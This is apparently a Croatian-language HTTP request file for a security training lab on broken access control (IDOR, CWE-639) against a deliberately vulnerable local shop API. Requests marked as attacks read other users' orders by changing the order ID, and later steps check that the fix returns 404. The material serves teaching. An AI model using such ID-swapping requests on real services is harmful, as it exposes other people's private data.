### =====================================================================
### Lab01 – A01 Broken Access Control: IDOR (CWE-639)
### Upute: docs/labs/lab01-idor.md
### Aplikacija: dotnet run --project src/VulnShop.Api --launch-profile http
### =====================================================================
@host = http://localhost:5080
# Nakon prijave kopirajte vrijednost "token" iz odgovora u varijablu ispod.
@token = ZALIJEPITE_TOKEN_OVDJE

### 1) Prijava kao ana (kopirajte "token" u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "ana", "password": "Ana123!"}

### 2) Ana čita SVOJU narudžbu 1001 – očekivano 200
GET {{host}}/api/lab01/orders/1001
Authorization: Bearer {{token}}

### 3) NAPAD: ana čita Markovu narudžbu 1003 (ranjivo: 200 + Markova adresa)
GET {{host}}/api/lab01/orders/1003
Authorization: Bearer {{token}}

### 4) NAPAD: ana čita administratorovu narudžbu 1004
GET {{host}}/api/lab01/orders/1004
Authorization: Bearer {{token}}

### 5) PROVJERA POPRAVKA: zahtjevi 3) i 4) moraju vratiti 404 (ne 403 – ne otkrivamo postojanje)
GET {{host}}/api/lab01/orders/1003
Authorization: Bearer {{token}}

### 6) Bez tokena – očekivano 401
GET {{host}}/api/lab01/orders/1001
